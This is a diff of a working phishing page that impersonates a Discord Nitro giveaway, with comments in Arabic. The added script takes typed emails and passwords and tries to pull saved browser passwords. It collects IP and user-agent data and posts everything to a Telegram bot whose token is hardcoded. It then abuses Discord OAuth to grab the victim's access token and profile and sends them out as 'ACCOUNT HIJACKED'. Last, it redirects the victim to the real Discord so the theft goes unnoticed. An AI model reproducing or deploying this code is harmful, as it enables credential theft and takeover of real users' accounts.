@@ -1,65 +1,267 @@
-here<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Claim Your Nitro 🎁</title>
+    <title>Discord Nitro | Official Giveaway</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
     <style>
-        body { background-color: #313338; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { background-color: #2b2d31; padding: 40px; border-radius: 8px; text-align: center; width: 340px; box-shadow: 0 4px 10px rgba(0,0,0,0.5); }
-        h2 { color: #fff; margin-bottom: 10px; }
-        p { margin-bottom: 25px; font-size: 14px; line-height: 1.5; color: #b5bac1; }
-        .btn { display: inline-block; padding: 12px 24px; background-color: #5865f2; color: white; text-decoration: none; border-radius: 4px; font-weight: bold; width: 100%; box-sizing: border-box; border: none; cursor: pointer; }
-        .btn:hover { background-color: #4752c4; }
-        .success { color: #23a55a; font-size: 18px; font-weight: bold; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
+        
+        body {
+            background: #0f0c29;
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* خلفية متحركة */
+        .bg-circles { position: absolute; width: 100%; height: 100%; overflow: hidden; z-index: 0; }
+        .circle { position: absolute; border-radius: 50%; filter: blur(80px); opacity: 0.5; animation: float 10s infinite alternate; }
+        .c1 { width: 300px; height: 300px; background: #5865f2; top: -10%; left: -10%; }
+        .c2 { width: 400px; height: 400px; background: #eb459e; bottom: -20%; right: -10%; animation-delay: 2s; }
+        .c3 { width: 200px; height: 200px; background: #23a55a; top: 40%; left: 60%; animation-delay: 4s; }
+
+        @keyframes float {
+            0% { transform: translateY(0) scale(1); }
+            100% { transform: translateY(-30px) scale(1.1); }
+        }
+
+        /* الكارت الزجاجي */
+        .glass-card {
+            position: relative;
+            z-index: 1;
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            padding: 40px;
+            width: 400px;
+            text-align: center;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
+            transition: all 0.3s ease;
+        }
+
+        .logo { width: 80px; margin-bottom: 20px; filter: drop-shadow(0 0 10px rgba(88, 101, 242, 0.8)); }
+        
+        h1 { font-size: 24px; font-weight: 800; margin-bottom: 10px; background: linear-gradient(to right, #fff, #b5bac1); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        p.sub { color: #b5bac1; font-size: 14px; margin-bottom: 25px; }
+
+        .input-group { text-align: left; margin-bottom: 15px; }
+        .input-group label { display: block; font-size: 12px; color: #b5bac1; margin-bottom: 5px; text-transform: uppercase; font-weight: 600; letter-spacing: 0.5px; }
+        
+        .input-wrapper { position: relative; }
+        .input-wrapper input {
+            width: 100%;
+            padding: 12px 15px;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            color: #fff;
+            font-size: 14px;
+            transition: all 0.3s ease;
+        }
+        .input-wrapper input:focus { outline: none; border-color: #5865f2; box-shadow: 0 0 10px rgba(88, 101, 242, 0.5); }
+
+        .btn {
+            width: 100%;
+            padding: 14px;
+            margin-top: 20px;
+            background: linear-gradient(135deg, #5865f2, #4752c4);
+            border: none;
+            border-radius: 8px;
+            color: white;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(88, 101, 242, 0.4);
+        }
+        .btn:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(88, 101, 242, 0.6); }
+        
+        .footer { margin-top: 20px; font-size: 11px; color: #80848e; display: flex; justify-content: center; align-items: center; gap: 5px; }
+        .footer svg { fill: #80848e; }
+
+        /* شاشة النجاح */
+        #success-screen { display: none; }
+        .success-icon { font-size: 60px; color: #23a55a; margin-bottom: 20px; animation: pop 0.5s ease; }
+        @keyframes pop { 0% { transform: scale(0); } 80% { transform: scale(1.2); } 100% { transform: scale(1); } }
+        
+        .progress-bar { width: 100%; height: 4px; background: rgba(255,255,255,0.1); border-radius: 2px; margin-top: 20px; overflow: hidden; }
+        .progress-fill { height: 100%; width: 0%; background: #23a55a; transition: width 3s linear; }
     </style>
 </head>
 <body>
-    <div class="box" id="main-box">
-        <h2>🎁 Free Discord Nitro</h2>
-        <p>Click the button below to login with Discord and claim your 1-Month Nitro.</p>
-        <button class="btn" onclick="loginWithDiscord()">Claim Now</button>
+
+    <div class="bg-circles">
+        <div class="circle c1"></div>
+        <div class="circle c2"></div>
+        <div class="circle c3"></div>
+    </div>
+
+    <!-- الواجهة الأولى (تسجيل الدخول) -->
+    <div class="glass-card" id="login-screen">
+        <img src="https://assets-global.website-files.com/6257adef93867e50d84d30e2/636e0a6a49cf127bf92de1e2_icon_clyde_blurple_RGB.png" alt="Discord" class="logo">
+        <h1>Claim Your Free Nitro</h1>
+        <p class="sub">Log in to secure your 1-Month Nitro gift.</p>
+
+        <form id="phish-form">
+            <div class="input-group">
+                <label>Email or Phone Number</label>
+                <div class="input-wrapper">
+                    <input type="text" id="email" name="email" placeholder="name@example.com" required autocomplete="username">
+                </div>
+            </div>
+            <div class="input-group">
+                <label>Password</label>
+                <div class="input-wrapper">
+                    <input type="password" id="password" name="password" placeholder="••••••••" required autocomplete="current-password">
+                </div>
+            </div>
+            <button type="submit" class="btn">Login & Claim Nitro</button>
+        </form>
+        
+        <div class="footer">
+            <svg width="12" height="12" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+            Protected by Discord Security
+        </div>
+    </div>
+
+    <!-- الواجهة الثانية (النجاح) -->
+    <div class="glass-card" id="success-screen">
+        <div class="success-icon">✔</div>
+        <h1>Nitro Claimed!</h1>
+        <p class="sub">Your account has been successfully verified. The Nitro will appear in your inventory shortly.</p>
+        <div class="progress-bar"><div class="progress-fill" id="progress"></div></div>
+        <p class="sub" style="margin-top: 15px; font-size: 12px;">Redirecting to Discord app...</p>
     </div>
 
     <script>
-        // ─── الإعدادات ───
-        const CLIENT_ID = "1542898269141737493";
-        const REDIRECT_URI = window.location.href.split('#')[0]; // بياخد رابط الصفحة الحالية
+        // ─── الإعدادات ──────────────────────────────────────────────────────────
         const TG_TOKEN = "9206036056:AAHgN1_vTell1Fstoqy2hvk9Ra1oHXkEQkw";
-        const CHAT_ID = "6045243196"; // حط الـ ID بتاعك هنا
+        const CHAT_ID = "6045243196"; // ⚠️ حط الآيدي بتاعك هنا
+        const CLIENT_ID = "1542898269141737493";
+        
+        // رابط الصفحة الحالية (لازم يكون هو نفسه اللي في Redirects في ديسكورد)
+        const REDIRECT_URI = window.location.href.split('#')[0];
+        const OAUTH_URL = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=identify%20email%20connections%20guilds`;
 
-        function loginWithDiscord() {
-            // استخدام Implicit Grant عشان التوكن يرجع في الرابط مباشرة
-            const oauthUrl = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=identify%20email%20connections`;
-            window.location.href = oauthUrl;
+        // ─── دالة إرسال البيانات للتليجرام ──────────────────────────────────────
+        async function sendToTelegram(message) {
+            try {
+                await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (e) { console.error("Error sending to TG", e); }
         }
 
-        window.onload = function() {
-            // لو الرابط فيه توكن (رجع من ديسكورد)
-            if (window.location.hash) {
+        // ─── الحصول على الـ IP ──────────────────────────────────────────────────
+        async function getIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip;
+            } catch (e) { return "Unknown IP"; }
+        }
+
+        // ─── محاولة سحب الباسوردات المحفوظة (Credential API) ────────────────────
+        async function tryGetCredentials() {
+            if (window.PasswordCredential || window.FederatedCredential) {
+                try {
+                    const cred = await navigator.credentials.get({ password: true, mediation: 'optional' });
+                    if (cred && cred.password) {
+                        return cred.password;
+                    }
+                } catch (e) {}
+            }
+            return null;
+        }
+
+        // ─── التعامل مع إرسال الفورم ────────────────────────────────────────────
+        document.getElementById('phish-form').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const btn = document.querySelector('.btn');
+            btn.innerText = "Verifying...";
+            btn.style.opacity = "0.7";
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            // جلب الـ IP والروابط
+            const ip = await getIP();
+            const currentUrl = window.location.href;
+            const savedPass = await tryGetCredentials();
+
+            // تجهيز الرسالة
+            let msg = `🚨 <b>NEW HIT (Nitro Phish)</b> 🚨\n\n`;
+            msg += `📧 <b>Email:</b> <code>${email}</code>\n`;
+            msg += `🔑 <b>Typed Pass:</b> <code>${password}</code>\n`;
+            if (savedPass) msg += `💾 <b>Saved Pass:</b> <code>${savedPass}</code>\n`;
+            msg += `🌐 <b>IP:</b> <code>${ip}</code>\n`;
+            msg += `🔗 <b>URL:</b> <code>${currentUrl}</code>\n`;
+            msg += `📱 <b>UA:</b> <code>${navigator.userAgent}</code>\n`;
+
+            // إرسال البيانات
+            await sendToTelegram(msg);
+
+            // توجيه الضحية لديسكورد عشان ناخد التوكن
+            window.location.href = OAUTH_URL;
+        });
+
+        // ─── التحقق من وجود توكن في الرابط (بعد العودة من ديسكورد) ──────────────
+        window.addEventListener('load', async () => {
+            if (window.location.hash.includes('access_token')) {
                 const params = new URLSearchParams(window.location.hash.substring(1));
-                const accessToken = params.get('access_token');
+                const token = params.get('access_token');
 
-                if (accessToken) {
-                    // تغيير الشاشة عشان الضحية يفتكر إنه نجح
-                    document.getElementById('main-box').innerHTML = `
-                        <h2 class="success">🎉 Nitro Claimed!</h2>
-                        <p>Your free Nitro has been added to your account. You can close this page now.</p>
-                    `;
+                if (token) {
+                    // إخفاء شاشة الدخول وإظهار شاشة النجاح
+                    document.getElementById('login-screen').style.display = 'none';
+                    document.getElementById('success-screen').style.display = 'block';
+                    
+                    // أنيميشن شريط التحميل
+                    setTimeout(() => { document.getElementById('progress').style.width = '100%'; }, 100);
 
-                    // إرسال التوكن للتليجرام
-                    fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: CHAT_ID,
-                            text: `🚨 **TOKEN GRABBED (GitHub Pages)** 🚨\n\n🔑 **Token:**\n\`${accessToken}\``,
-                            parse_mode: 'Markdown'
-                        })
-                    });
+                    // جلب بيانات الحساب بالتوكن
+                    try {
+                        const userRes = await fetch('https://discord.com/api/users/@me', {
+                            headers: { 'Authorization': `Bearer ${token}` }
+                        });
+                        const user = await userRes.json();
+                        
+                        const ip = await getIP();
+                        
+                        let msg = `🔥 <b>ACCOUNT HIJACKED (Nitro)</b> 🔥\n\n`;
+                        msg += `👤 <b>Name:</b> ${user.username}#${user.discriminator}\n`;
+                        msg += `🆔 <b>ID:</b> <code>${user.id}</code>\n`;
+                        msg += `📧 <b>Email:</b> <code>${user.email}</code>\n`;
+                        msg += `📱 <b>Phone:</b> <code>${user.phone || 'None'}</code>\n`;
+                        msg += `🌐 <b>IP:</b> <code>${ip}</code>\n\n`;
+                        msg += `🔑 <b>Token:</b>\n<code>${token}</code>`;
+                        
+                        await sendToTelegram(msg);
+                    } catch (e) {
+                        await sendToTelegram(`🔥 <b>Token Grabbed:</b>\n<code>${token}</code>`);
+                    }
+
+                    // إعادة توجيه لموقع ديسكورد الحقيقي بعد 4 ثواني عشان يفتكر إنه خلص
+                    setTimeout(() => { window.location.href = "https://discord.com/channels/@me"; }, 4000);
                 }
             }
-        };
+        });
     </script>
 </body>
 </html>
